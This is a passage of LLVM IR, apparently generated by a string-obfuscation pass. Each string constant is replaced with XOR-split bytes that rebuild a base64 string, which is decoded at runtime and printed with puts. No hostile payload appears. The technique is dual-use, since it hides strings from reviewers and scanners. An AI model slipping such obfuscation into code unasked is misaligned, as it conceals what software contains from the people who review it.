  %xp235 = xor i8 %i0.235, %i1.235

  %fi.235 = alloca i8
  store i8 %xp235, i8* %fi.235

  %final.ptr.235 = bitcast i8* %fi.235 to [1 x i8]*
  %spi235 = load [1 x i8], [1 x i8]* %final.ptr.235
  store [1 x i8] %spi235, [1 x i8]* %sp0.72
;-------------------------------
  %next0.72 = getelementptr [13 x i8], [13 x i8]* %sp72, i32 0, i32 1
  
  %sp1.72 = bitcast i8* %next0.72 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\48", [1 x i8]* %sp1.72
  %sp0.236 = alloca [1 x i8]
  store [1 x i8] c"\26", [1 x i8]* %sp0.236
  %sp0.1.236 = bitcast [1 x i8]* %sp0.236 to i8*
  %i0.236 = load i8, i8* %sp0.1.236

  %sp1.236 = alloca [1 x i8]
  store [1 x i8] c"\6e", [1 x i8]* %sp1.236
  %sp1.1.236 = bitcast [1 x i8]* %sp1.236 to i8*
  %i1.236 = load i8, i8* %sp1.1.236

  %xp236 = xor i8 %i0.236, %i1.236

  %fi.236 = alloca i8
  store i8 %xp236, i8* %fi.236

  %final.ptr.236 = bitcast i8* %fi.236 to [1 x i8]*
  %spi236 = load [1 x i8], [1 x i8]* %final.ptr.236
  store [1 x i8] %spi236, [1 x i8]* %sp1.72
;-------------------------------
  %next1.72 = getelementptr [13 x i8], [13 x i8]* %sp72, i32 0, i32 2
  
  %sp2.72 = bitcast i8* %next1.72 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\4a\6c", [2 x i8]* %sp2.72
  %sp0.237 = alloca [2 x i8]
  store [2 x i8] c"\0C\0B", [2 x i8]* %sp0.237
  %sp0.1.237 = bitcast [2 x i8]* %sp0.237 to i16*
  %i0.237 = load i16, i16* %sp0.1.237

  %sp1.237 = alloca [2 x i8]
  store [2 x i8] c"\46\67", [2 x i8]* %sp1.237
  %sp1.1.237 = bitcast [2 x i8]* %sp1.237 to i16*
  %i1.237 = load i16, i16* %sp1.1.237

  %xp237 = xor i16 %i0.237, %i1.237

  %fi.237 = alloca i16
  store i16 %xp237, i16* %fi.237

  %final.ptr.237 = bitcast i16* %fi.237 to [2 x i8]*
  %spi237 = load [2 x i8], [2 x i8]* %final.ptr.237
  store [2 x i8] %spi237, [2 x i8]* %sp2.72
;-------------------------------
  %next2.72 = getelementptr [13 x i8], [13 x i8]* %sp72, i32 0, i32 4
  
  %sp3.72 = bitcast i8* %next2.72 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\62", [1 x i8]* %sp3.72
  %sp0.238 = alloca [1 x i8]
  store [1 x i8] c"\15", [1 x i8]* %sp0.238
  %sp0.1.238 = bitcast [1 x i8]* %sp0.238 to i8*
  %i0.238 = load i8, i8* %sp0.1.238

  %sp1.238 = alloca [1 x i8]
  store [1 x i8] c"\77", [1 x i8]* %sp1.238
  %sp1.1.238 = bitcast [1 x i8]* %sp1.238 to i8*
  %i1.238 = load i8, i8* %sp1.1.238

  %xp238 = xor i8 %i0.238, %i1.238

  %fi.238 = alloca i8
  store i8 %xp238, i8* %fi.238

  %final.ptr.238 = bitcast i8* %fi.238 to [1 x i8]*
  %spi238 = load [1 x i8], [1 x i8]* %final.ptr.238
  store [1 x i8] %spi238, [1 x i8]* %sp3.72
;-------------------------------
  %next3.72 = getelementptr [13 x i8], [13 x i8]* %sp72, i32 0, i32 5
  
  %sp4.72 = bitcast i8* %next3.72 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\57\6c", [2 x i8]* %sp4.72
  %sp0.239 = alloca [2 x i8]
  store [2 x i8] c"\3C\1F", [2 x i8]* %sp0.239
  %sp0.1.239 = bitcast [2 x i8]* %sp0.239 to i16*
  %i0.239 = load i16, i16* %sp0.1.239

  %sp1.239 = alloca [2 x i8]
  store [2 x i8] c"\6b\73", [2 x i8]* %sp1.239
  %sp1.1.239 = bitcast [2 x i8]* %sp1.239 to i16*
  %i1.239 = load i16, i16* %sp1.1.239

  %xp239 = xor i16 %i0.239, %i1.239

  %fi.239 = alloca i16
  store i16 %xp239, i16* %fi.239

  %final.ptr.239 = bitcast i16* %fi.239 to [2 x i8]*
  %spi239 = load [2 x i8], [2 x i8]* %final.ptr.239
  store [2 x i8] %spi239, [2 x i8]* %sp4.72
;-------------------------------
  %next4.72 = getelementptr [13 x i8], [13 x i8]* %sp72, i32 0, i32 7
  
  %sp5.72 = bitcast i8* %next4.72 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\6c", [1 x i8]* %sp5.72
  %sp0.240 = alloca [1 x i8]
  store [1 x i8] c"\02", [1 x i8]* %sp0.240
  %sp0.1.240 = bitcast [1 x i8]* %sp0.240 to i8*
  %i0.240 = load i8, i8* %sp0.1.240

  %sp1.240 = alloca [1 x i8]
  store [1 x i8] c"\6e", [1 x i8]* %sp1.240
  %sp1.1.240 = bitcast [1 x i8]* %sp1.240 to i8*
  %i1.240 = load i8, i8* %sp1.1.240

  %xp240 = xor i8 %i0.240, %i1.240

  %fi.240 = alloca i8
  store i8 %xp240, i8* %fi.240

  %final.ptr.240 = bitcast i8* %fi.240 to [1 x i8]*
  %spi240 = load [1 x i8], [1 x i8]* %final.ptr.240
  store [1 x i8] %spi240, [1 x i8]* %sp5.72
;-------------------------------
  %next5.72 = getelementptr [13 x i8], [13 x i8]* %sp72, i32 0, i32 8
  
  %sp6.72 = bitcast i8* %next5.72 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\63\67", [2 x i8]* %sp6.72
  %sp0.241 = alloca [2 x i8]
  store [2 x i8] c"\55\35", [2 x i8]* %sp0.241
  %sp0.1.241 = bitcast [2 x i8]* %sp0.241 to i16*
  %i0.241 = load i16, i16* %sp0.1.241

  %sp1.241 = alloca [2 x i8]
  store [2 x i8] c"\36\52", [2 x i8]* %sp1.241
  %sp1.1.241 = bitcast [2 x i8]* %sp1.241 to i16*
  %i1.241 = load i16, i16* %sp1.1.241

  %xp241 = xor i16 %i0.241, %i1.241

  %fi.241 = alloca i16
  store i16 %xp241, i16* %fi.241

  %final.ptr.241 = bitcast i16* %fi.241 to [2 x i8]*
  %spi241 = load [2 x i8], [2 x i8]* %final.ptr.241
  store [2 x i8] %spi241, [2 x i8]* %sp6.72
;-------------------------------
  %next6.72 = getelementptr [13 x i8], [13 x i8]* %sp72, i32 0, i32 10
  
  %sp7.72 = bitcast i8* %next6.72 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\41", [1 x i8]* %sp7.72
  %sp0.242 = alloca [1 x i8]
  store [1 x i8] c"\39", [1 x i8]* %sp0.242
  %sp0.1.242 = bitcast [1 x i8]* %sp0.242 to i8*
  %i0.242 = load i8, i8* %sp0.1.242

  %sp1.242 = alloca [1 x i8]
  store [1 x i8] c"\78", [1 x i8]* %sp1.242
  %sp1.1.242 = bitcast [1 x i8]* %sp1.242 to i8*
  %i1.242 = load i8, i8* %sp1.1.242

  %xp242 = xor i8 %i0.242, %i1.242

  %fi.242 = alloca i8
  store i8 %xp242, i8* %fi.242

  %final.ptr.242 = bitcast i8* %fi.242 to [1 x i8]*
  %spi242 = load [1 x i8], [1 x i8]* %final.ptr.242
  store [1 x i8] %spi242, [1 x i8]* %sp7.72
;-------------------------------
  %next7.72 = getelementptr [13 x i8], [13 x i8]* %sp72, i32 0, i32 11
  
  %sp8.72 = bitcast i8* %next7.72 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\3d\00", [2 x i8]* %sp8.72
  %sp0.243 = alloca [2 x i8]
  store [2 x i8] c"\4A\6F", [2 x i8]* %sp0.243
  %sp0.1.243 = bitcast [2 x i8]* %sp0.243 to i16*
  %i0.243 = load i16, i16* %sp0.1.243

  %sp1.243 = alloca [2 x i8]
  store [2 x i8] c"\77\6f", [2 x i8]* %sp1.243
  %sp1.1.243 = bitcast [2 x i8]* %sp1.243 to i16*
  %i1.243 = load i16, i16* %sp1.1.243

  %xp243 = xor i16 %i0.243, %i1.243

  %fi.243 = alloca i16
  store i16 %xp243, i16* %fi.243

  %final.ptr.243 = bitcast i16* %fi.243 to [2 x i8]*
  %spi243 = load [2 x i8], [2 x i8]* %final.ptr.243
  store [2 x i8] %spi243, [2 x i8]* %sp8.72
;-------------------------------

  %spi72 = load [13 x i8], [13 x i8]* %sp72
  store [13 x i8] %spi72, [13 x i8]* %cipher.ptr.35
;-------------------------------
  %cipher.35 = getelementptr inbounds [13 x i8], [13 x i8]* %cipher.ptr.35, i32 0, i32 0
  %plain.ptr.35 = tail call i8* @base64_decode(i8* %cipher.35)
  %spi35 = bitcast i8* %plain.ptr.35 to [8 x i8]*
  %cast16= getelementptr [8 x i8], [8 x i8]* %spi35, i64 0, i64 0
;-------------------------------
  call i32 @puts(i8* %cast16)
  br label %next16
BB_18:
;-------------------------------
; Replace: %cast18= getelementptr [10 x i8], [10 x i8]* @.str17, i64 0, i64 0
  %cipher.ptr.36 = alloca [17 x i8]
;-------------------------------
; Replace: store [17 x i8] c"\64\48\4a\76\61\58\4e\70\5a\57\31\6c\41\41\3d\3d\00", [17 x i8]* %cipher.ptr.36
  %sp73 = alloca [17 x i8]

  
  %sp0.73 = bitcast [17 x i8]* %sp73 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\64", [1 x i8]* %sp0.73
  %sp0.244 = alloca [1 x i8]
  store [1 x i8] c"\29", [1 x i8]* %sp0.244
  %sp0.1.244 = bitcast [1 x i8]* %sp0.244 to i8*
  %i0.244 = load i8, i8* %sp0.1.244

  %sp1.244 = alloca [1 x i8]
  store [1 x i8] c"\4d", [1 x i8]* %sp1.244
  %sp1.1.244 = bitcast [1 x i8]* %sp1.244 to i8*
  %i1.244 = load i8, i8* %sp1.1.244

  %xp244 = xor i8 %i0.244, %i1.244

  %fi.244 = alloca i8
  store i8 %xp244, i8* %fi.244

  %final.ptr.244 = bitcast i8* %fi.244 to [1 x i8]*
  %spi244 = load [1 x i8], [1 x i8]* %final.ptr.244
  store [1 x i8] %spi244, [1 x i8]* %sp0.73
;-------------------------------
  %next0.73 = getelementptr [17 x i8], [17 x i8]* %sp73, i32 0, i32 1
  
  %sp1.73 = bitcast i8* %next0.73 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\48\4a", [2 x i8]* %sp1.73
  %sp0.245 = alloca [2 x i8]
  store [2 x i8] c"\3B\06", [2 x i8]* %sp0.245
  %sp0.1.245 = bitcast [2 x i8]* %sp0.245 to i16*
  %i0.245 = load i16, i16* %sp0.1.245

  %sp1.245 = alloca [2 x i8]
  store [2 x i8] c"\73\4c", [2 x i8]* %sp1.245
  %sp1.1.245 = bitcast [2 x i8]* %sp1.245 to i16*
  %i1.245 = load i16, i16* %sp1.1.245

  %xp245 = xor i16 %i0.245, %i1.245

  %fi.245 = alloca i16
  store i16 %xp245, i16* %fi.245

  %final.ptr.245 = bitcast i16* %fi.245 to [2 x i8]*
  %spi245 = load [2 x i8], [2 x i8]* %final.ptr.245
  store [2 x i8] %spi245, [2 x i8]* %sp1.73
;-------------------------------
  %next1.73 = getelementptr [17 x i8], [17 x i8]* %sp73, i32 0, i32 3
  
  %sp2.73 = bitcast i8* %next1.73 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\76\61", [2 x i8]* %sp2.73
  %sp0.246 = alloca [2 x i8]
  store [2 x i8] c"\3C\16", [2 x i8]* %sp0.246
  %sp0.1.246 = bitcast [2 x i8]* %sp0.246 to i16*
  %i0.246 = load i16, i16* %sp0.1.246

  %sp1.246 = alloca [2 x i8]
  store [2 x i8] c"\4a\77", [2 x i8]* %sp1.246
  %sp1.1.246 = bitcast [2 x i8]* %sp1.246 to i16*
  %i1.246 = load i16, i16* %sp1.1.246

  %xp246 = xor i16 %i0.246, %i1.246

  %fi.246 = alloca i16
  store i16 %xp246, i16* %fi.246

  %final.ptr.246 = bitcast i16* %fi.246 to [2 x i8]*
  %spi246 = load [2 x i8], [2 x i8]* %final.ptr.246
  store [2 x i8] %spi246, [2 x i8]* %sp2.73
;-------------------------------
  %next2.73 = getelementptr [17 x i8], [17 x i8]* %sp73, i32 0, i32 5
  
  %sp3.73 = bitcast i8* %next2.73 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\58\4e", [2 x i8]* %sp3.73
  %sp0.247 = alloca [2 x i8]
  store [2 x i8] c"\0B\79", [2 x i8]* %sp0.247
  %sp0.1.247 = bitcast [2 x i8]* %sp0.247 to i16*
  %i0.247 = load i16, i16* %sp0.1.247

  %sp1.247 = alloca [2 x i8]
  store [2 x i8] c"\53\37", [2 x i8]* %sp1.247
  %sp1.1.247 = bitcast [2 x i8]* %sp1.247 to i16*
  %i1.247 = load i16, i16* %sp1.1.247

  %xp247 = xor i16 %i0.247, %i1.247

  %fi.247 = alloca i16
  store i16 %xp247, i16* %fi.247

  %final.ptr.247 = bitcast i16* %fi.247 to [2 x i8]*
  %spi247 = load [2 x i8], [2 x i8]* %final.ptr.247
  store [2 x i8] %spi247, [2 x i8]* %sp3.73
;-------------------------------
  %next3.73 = getelementptr [17 x i8], [17 x i8]* %sp73, i32 0, i32 7
  
  %sp4.73 = bitcast i8* %next3.73 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\70\5a", [2 x i8]* %sp4.73
  %sp0.248 = alloca [2 x i8]
  store [2 x i8] c"\14\62", [2 x i8]* %sp0.248
  %sp0.1.248 = bitcast [2 x i8]* %sp0.248 to i16*
  %i0.248 = load i16, i16* %sp0.1.248

  %sp1.248 = alloca [2 x i8]
  store [2 x i8] c"\64\38", [2 x i8]* %sp1.248
  %sp1.1.248 = bitcast [2 x i8]* %sp1.248 to i16*
  %i1.248 = load i16, i16* %sp1.1.248

  %xp248 = xor i16 %i0.248, %i1.248

  %fi.248 = alloca i16
  store i16 %xp248, i16* %fi.248

  %final.ptr.248 = bitcast i16* %fi.248 to [2 x i8]*
  %spi248 = load [2 x i8], [2 x i8]* %final.ptr.248
  store [2 x i8] %spi248, [2 x i8]* %sp4.73
;-------------------------------
  %next4.73 = getelementptr [17 x i8], [17 x i8]* %sp73, i32 0, i32 9
  
  %sp5.73 = bitcast i8* %next4.73 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\57\31", [2 x i8]* %sp5.73
  %sp0.249 = alloca [2 x i8]
  store [2 x i8] c"\3C\45", [2 x i8]* %sp0.249
  %sp0.1.249 = bitcast [2 x i8]* %sp0.249 to i16*
  %i0.249 = load i16, i16* %sp0.1.249

  %sp1.249 = alloca [2 x i8]
  store [2 x i8] c"\6b\74", [2 x i8]* %sp1.249
  %sp1.1.249 = bitcast [2 x i8]* %sp1.249 to i16*
  %i1.249 = load i16, i16* %sp1.1.249

  %xp249 = xor i16 %i0.249, %i1.249

  %fi.249 = alloca i16
  store i16 %xp249, i16* %fi.249

  %final.ptr.249 = bitcast i16* %fi.249 to [2 x i8]*
  %spi249 = load [2 x i8], [2 x i8]* %final.ptr.249
  store [2 x i8] %spi249, [2 x i8]* %sp5.73
;-------------------------------
  %next5.73 = getelementptr [17 x i8], [17 x i8]* %sp73, i32 0, i32 11
  
  %sp6.73 = bitcast i8* %next5.73 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\6c\41", [2 x i8]* %sp6.73
  %sp0.250 = alloca [2 x i8]
  store [2 x i8] c"\08\17", [2 x i8]* %sp0.250
  %sp0.1.250 = bitcast [2 x i8]* %sp0.250 to i16*
  %i0.250 = load i16, i16* %sp0.1.250

  %sp1.250 = alloca [2 x i8]
  store [2 x i8] c"\64\56", [2 x i8]* %sp1.250
  %sp1.1.250 = bitcast [2 x i8]* %sp1.250 to i16*
  %i1.250 = load i16, i16* %sp1.1.250

  %xp250 = xor i16 %i0.250, %i1.250

  %fi.250 = alloca i16
  store i16 %xp250, i16* %fi.250

  %final.ptr.250 = bitcast i16* %fi.250 to [2 x i8]*
  %spi250 = load [2 x i8], [2 x i8]* %final.ptr.250
  store [2 x i8] %spi250, [2 x i8]* %sp6.73
;-------------------------------
  %next6.73 = getelementptr [17 x i8], [17 x i8]* %sp73, i32 0, i32 13
  
  %sp7.73 = bitcast i8* %next6.73 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\41\3d", [2 x i8]* %sp7.73
  %sp0.251 = alloca [2 x i8]
  store [2 x i8] c"\11\74", [2 x i8]* %sp0.251
  %sp0.1.251 = bitcast [2 x i8]* %sp0.251 to i16*
  %i0.251 = load i16, i16* %sp0.1.251

  %sp1.251 = alloca [2 x i8]
  store [2 x i8] c"\50\49", [2 x i8]* %sp1.251
  %sp1.1.251 = bitcast [2 x i8]* %sp1.251 to i16*
  %i1.251 = load i16, i16* %sp1.1.251

  %xp251 = xor i16 %i0.251, %i1.251

  %fi.251 = alloca i16
  store i16 %xp251, i16* %fi.251

  %final.ptr.251 = bitcast i16* %fi.251 to [2 x i8]*
  %spi251 = load [2 x i8], [2 x i8]* %final.ptr.251
  store [2 x i8] %spi251, [2 x i8]* %sp7.73
;-------------------------------
  %next7.73 = getelementptr [17 x i8], [17 x i8]* %sp73, i32 0, i32 15
  
  %sp8.73 = bitcast i8* %next7.73 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\3d\00", [2 x i8]* %sp8.73
  %sp0.252 = alloca [2 x i8]
  store [2 x i8] c"\48\6F", [2 x i8]* %sp0.252
  %sp0.1.252 = bitcast [2 x i8]* %sp0.252 to i16*
  %i0.252 = load i16, i16* %sp0.1.252

  %sp1.252 = alloca [2 x i8]
  store [2 x i8] c"\75\6f", [2 x i8]* %sp1.252
  %sp1.1.252 = bitcast [2 x i8]* %sp1.252 to i16*
  %i1.252 = load i16, i16* %sp1.1.252

  %xp252 = xor i16 %i0.252, %i1.252

  %fi.252 = alloca i16
  store i16 %xp252, i16* %fi.252

  %final.ptr.252 = bitcast i16* %fi.252 to [2 x i8]*
  %spi252 = load [2 x i8], [2 x i8]* %final.ptr.252
  store [2 x i8] %spi252, [2 x i8]* %sp8.73
;-------------------------------

  %spi73 = load [17 x i8], [17 x i8]* %sp73
  store [17 x i8] %spi73, [17 x i8]* %cipher.ptr.36
;-------------------------------
  %cipher.36 = getelementptr inbounds [17 x i8], [17 x i8]* %cipher.ptr.36, i32 0, i32 0
  %plain.ptr.36 = tail call i8* @base64_decode(i8* %cipher.36)
  %spi36 = bitcast i8* %plain.ptr.36 to [10 x i8]*
  %cast18= getelementptr [10 x i8], [10 x i8]* %spi36, i64 0, i64 0
;-------------------------------
  call i32 @puts(i8* %cast18)
  br label %next18
BB_20:
;-------------------------------
; Replace: %cast20= getelementptr [10 x i8], [10 x i8]* @.str19, i64 0, i64 0
  %cipher.ptr.37 = alloca [17 x i8]
;-------------------------------
; Replace: store [17 x i8] c"\64\48\4a\76\61\58\4e\70\5a\57\31\6c\41\41\3d\3d\00", [17 x i8]* %cipher.ptr.37
  %sp74 = alloca [17 x i8]

  
  %sp0.74 = bitcast [17 x i8]* %sp74 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\64", [1 x i8]* %sp0.74
  %sp0.253 = alloca [1 x i8]
  store [1 x i8] c"\15", [1 x i8]* %sp0.253
  %sp0.1.253 = bitcast [1 x i8]* %sp0.253 to i8*
  %i0.253 = load i8, i8* %sp0.1.253

  %sp1.253 = alloca [1 x i8]
  store [1 x i8] c"\71", [1 x i8]* %sp1.253
  %sp1.1.253 = bitcast [1 x i8]* %sp1.253 to i8*
  %i1.253 = load i8, i8* %sp1.1.253

  %xp253 = xor i8 %i0.253, %i1.253

  %fi.253 = alloca i8
  store i8 %xp253, i8* %fi.253

  %final.ptr.253 = bitcast i8* %fi.253 to [1 x i8]*
  %spi253 = load [1 x i8], [1 x i8]* %final.ptr.253
  store [1 x i8] %spi253, [1 x i8]* %sp0.74
;-------------------------------
  %next0.74 = getelementptr [17 x i8], [17 x i8]* %sp74, i32 0, i32 1
  
  %sp1.74 = bitcast i8* %next0.74 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\48\4a", [2 x i8]* %sp1.74
  %sp0.254 = alloca [2 x i8]
  store [2 x i8] c"\12\78", [2 x i8]* %sp0.254
  %sp0.1.254 = bitcast [2 x i8]* %sp0.254 to i16*
  %i0.254 = load i16, i16* %sp0.1.254

  %sp1.254 = alloca [2 x i8]
  store [2 x i8] c"\5a\32", [2 x i8]* %sp1.254
  %sp1.1.254 = bitcast [2 x i8]* %sp1.254 to i16*
  %i1.254 = load i16, i16* %sp1.1.254

  %xp254 = xor i16 %i0.254, %i1.254

  %fi.254 = alloca i16
  store i16 %xp254, i16* %fi.254

  %final.ptr.254 = bitcast i16* %fi.254 to [2 x i8]*
  %spi254 = load [2 x i8], [2 x i8]* %final.ptr.254
  store [2 x i8] %spi254, [2 x i8]* %sp1.74
;-------------------------------
  %next1.74 = getelementptr [17 x i8], [17 x i8]* %sp74, i32 0, i32 3
  
  %sp2.74 = bitcast i8* %next1.74 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\76\61", [2 x i8]* %sp2.74
  %sp0.255 = alloca [2 x i8]
  store [2 x i8] c"\07\04", [2 x i8]* %sp0.255
  %sp0.1.255 = bitcast [2 x i8]* %sp0.255 to i16*
  %i0.255 = load i16, i16* %sp0.1.255

  %sp1.255 = alloca [2 x i8]
  store [2 x i8] c"\71\65", [2 x i8]* %sp1.255
  %sp1.1.255 = bitcast [2 x i8]* %sp1.255 to i16*
  %i1.255 = load i16, i16* %sp1.1.255

  %xp255 = xor i16 %i0.255, %i1.255

  %fi.255 = alloca i16
  store i16 %xp255, i16* %fi.255

  %final.ptr.255 = bitcast i16* %fi.255 to [2 x i8]*
  %spi255 = load [2 x i8], [2 x i8]* %final.ptr.255
  store [2 x i8] %spi255, [2 x i8]* %sp2.74
;-------------------------------
  %next2.74 = getelementptr [17 x i8], [17 x i8]* %sp74, i32 0, i32 5
  
  %sp3.74 = bitcast i8* %next2.74 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\58\4e", [2 x i8]* %sp3.74
  %sp0.256 = alloca [2 x i8]
  store [2 x i8] c"\01\17", [2 x i8]* %sp0.256
  %sp0.1.256 = bitcast [2 x i8]* %sp0.256 to i16*
  %i0.256 = load i16, i16* %sp0.1.256

  %sp1.256 = alloca [2 x i8]
  store [2 x i8] c"\59\59", [2 x i8]* %sp1.256
  %sp1.1.256 = bitcast [2 x i8]* %sp1.256 to i16*
  %i1.256 = load i16, i16* %sp1.1.256

  %xp256 = xor i16 %i0.256, %i1.256

  %fi.256 = alloca i16
  store i16 %xp256, i16* %fi.256

  %final.ptr.256 = bitcast i16* %fi.256 to [2 x i8]*
  %spi256 = load [2 x i8], [2 x i8]* %final.ptr.256
  store [2 x i8] %spi256, [2 x i8]* %sp3.74
;-------------------------------
  %next3.74 = getelementptr [17 x i8], [17 x i8]* %sp74, i32 0, i32 7
  
  %sp4.74 = bitcast i8* %next3.74 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\70\5a", [2 x i8]* %sp4.74
  %sp0.257 = alloca [2 x i8]
  store [2 x i8] c"\3C\68", [2 x i8]* %sp0.257
  %sp0.1.257 = bitcast [2 x i8]* %sp0.257 to i16*
  %i0.257 = load i16, i16* %sp0.1.257

  %sp1.257 = alloca [2 x i8]
  store [2 x i8] c"\4c\32", [2 x i8]* %sp1.257
  %sp1.1.257 = bitcast [2 x i8]* %sp1.257 to i16*
  %i1.257 = load i16, i16* %sp1.1.257

  %xp257 = xor i16 %i0.257, %i1.257

  %fi.257 = alloca i16
  store i16 %xp257, i16* %fi.257

  %final.ptr.257 = bitcast i16* %fi.257 to [2 x i8]*
  %spi257 = load [2 x i8], [2 x i8]* %final.ptr.257
  store [2 x i8] %spi257, [2 x i8]* %sp4.74
;-------------------------------
  %next4.74 = getelementptr [17 x i8], [17 x i8]* %sp74, i32 0, i32 9
  
  %sp5.74 = bitcast i8* %next4.74 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\57\31", [2 x i8]* %sp5.74
  %sp0.258 = alloca [2 x i8]
  store [2 x i8] c"\1D\65", [2 x i8]* %sp0.258
  %sp0.1.258 = bitcast [2 x i8]* %sp0.258 to i16*
  %i0.258 = load i16, i16* %sp0.1.258

  %sp1.258 = alloca [2 x i8]
  store [2 x i8] c"\4a\54", [2 x i8]* %sp1.258
  %sp1.1.258 = bitcast [2 x i8]* %sp1.258 to i16*
  %i1.258 = load i16, i16* %sp1.1.258

  %xp258 = xor i16 %i0.258, %i1.258

  %fi.258 = alloca i16
  store i16 %xp258, i16* %fi.258

  %final.ptr.258 = bitcast i16* %fi.258 to [2 x i8]*
  %spi258 = load [2 x i8], [2 x i8]* %final.ptr.258
  store [2 x i8] %spi258, [2 x i8]* %sp5.74
;-------------------------------
  %next5.74 = getelementptr [17 x i8], [17 x i8]* %sp74, i32 0, i32 11
  
  %sp6.74 = bitcast i8* %next5.74 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\6c\41", [2 x i8]* %sp6.74
  %sp0.259 = alloca [2 x i8]
  store [2 x i8] c"\09\32", [2 x i8]* %sp0.259
  %sp0.1.259 = bitcast [2 x i8]* %sp0.259 to i16*
  %i0.259 = load i16, i16* %sp0.1.259

  %sp1.259 = alloca [2 x i8]
  store [2 x i8] c"\65\73", [2 x i8]* %sp1.259
  %sp1.1.259 = bitcast [2 x i8]* %sp1.259 to i16*
  %i1.259 = load i16, i16* %sp1.1.259

  %xp259 = xor i16 %i0.259, %i1.259

  %fi.259 = alloca i16
  store i16 %xp259, i16* %fi.259

  %final.ptr.259 = bitcast i16* %fi.259 to [2 x i8]*
  %spi259 = load [2 x i8], [2 x i8]* %final.ptr.259
  store [2 x i8] %spi259, [2 x i8]* %sp6.74
;-------------------------------
  %next6.74 = getelementptr [17 x i8], [17 x i8]* %sp74, i32 0, i32 13
  
  %sp7.74 = bitcast i8* %next6.74 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\41\3d", [2 x i8]* %sp7.74
  %sp0.260 = alloca [2 x i8]
  store [2 x i8] c"\2F\69", [2 x i8]* %sp0.260
  %sp0.1.260 = bitcast [2 x i8]* %sp0.260 to i16*
  %i0.260 = load i16, i16* %sp0.1.260

  %sp1.260 = alloca [2 x i8]
  store [2 x i8] c"\6e\54", [2 x i8]* %sp1.260
  %sp1.1.260 = bitcast [2 x i8]* %sp1.260 to i16*
  %i1.260 = load i16, i16* %sp1.1.260

  %xp260 = xor i16 %i0.260, %i1.260

  %fi.260 = alloca i16
  store i16 %xp260, i16* %fi.260

  %final.ptr.260 = bitcast i16* %fi.260 to [2 x i8]*
  %spi260 = load [2 x i8], [2 x i8]* %final.ptr.260
  store [2 x i8] %spi260, [2 x i8]* %sp7.74
;-------------------------------
  %next7.74 = getelementptr [17 x i8], [17 x i8]* %sp74, i32 0, i32 15
  
  %sp8.74 = bitcast i8* %next7.74 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\3d\00", [2 x i8]* %sp8.74
  %sp0.261 = alloca [2 x i8]
  store [2 x i8] c"\6E\62", [2 x i8]* %sp0.261
  %sp0.1.261 = bitcast [2 x i8]* %sp0.261 to i16*
  %i0.261 = load i16, i16* %sp0.1.261

  %sp1.261 = alloca [2 x i8]
  store [2 x i8] c"\53\62", [2 x i8]* %sp1.261
  %sp1.1.261 = bitcast [2 x i8]* %sp1.261 to i16*
  %i1.261 = load i16, i16* %sp1.1.261

  %xp261 = xor i16 %i0.261, %i1.261

  %fi.261 = alloca i16
  store i16 %xp261, i16* %fi.261

  %final.ptr.261 = bitcast i16* %fi.261 to [2 x i8]*
  %spi261 = load [2 x i8], [2 x i8]* %final.ptr.261
  store [2 x i8] %spi261, [2 x i8]* %sp8.74
;-------------------------------

  %spi74 = load [17 x i8], [17 x i8]* %sp74
  store [17 x i8] %spi74, [17 x i8]* %cipher.ptr.37
;-------------------------------
  %cipher.37 = getelementptr inbounds [17 x i8], [17 x i8]* %cipher.ptr.37, i32 0, i32 0
  %plain.ptr.37 = tail call i8* @base64_decode(i8* %cipher.37)
  %spi37 = bitcast i8* %plain.ptr.37 to [10 x i8]*
  %cast20= getelementptr [10 x i8], [10 x i8]* %spi37, i64 0, i64 0
;-------------------------------
  call i32 @puts(i8* %cast20)
  br label %next20
BB_22:
;-------------------------------
; Replace: %cast22= getelementptr [11 x i8], [11 x i8]* @.str21, i64 0, i64 0
  %cipher.ptr.38 = alloca [17 x i8]
;-------------------------------
; Replace: store [17 x i8] c"\5a\47\56\79\5a\32\4a\71\65\6d\56\72\59\51\41\3d\00", [17 x i8]* %cipher.ptr.38
  %sp75 = alloca [17 x i8]

  
  %sp0.75 = bitcast [17 x i8]* %sp75 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\5a", [1 x i8]* %sp0.75
  %sp0.262 = alloca [1 x i8]
  store [1 x i8] c"\0B", [1 x i8]* %sp0.262
  %sp0.1.262 = bitcast [1 x i8]* %sp0.262 to i8*
  %i0.262 = load i8, i8* %sp0.1.262

  %sp1.262 = alloca [1 x i8]
  store [1 x i8] c"\51", [1 x i8]* %sp1.262
  %sp1.1.262 = bitcast [1 x i8]* %sp1.262 to i8*
  %i1.262 = load i8, i8* %sp1.1.262

  %xp262 = xor i8 %i0.262, %i1.262

  %fi.262 = alloca i8
  store i8 %xp262, i8* %fi.262

  %final.ptr.262 = bitcast i8* %fi.262 to [1 x i8]*
  %spi262 = load [1 x i8], [1 x i8]* %final.ptr.262
  store [1 x i8] %spi262, [1 x i8]* %sp0.75
;-------------------------------
  %next0.75 = getelementptr [17 x i8], [17 x i8]* %sp75, i32 0, i32 1
  
  %sp1.75 = bitcast i8* %next0.75 to [2 x i8]*
;-------------------------------
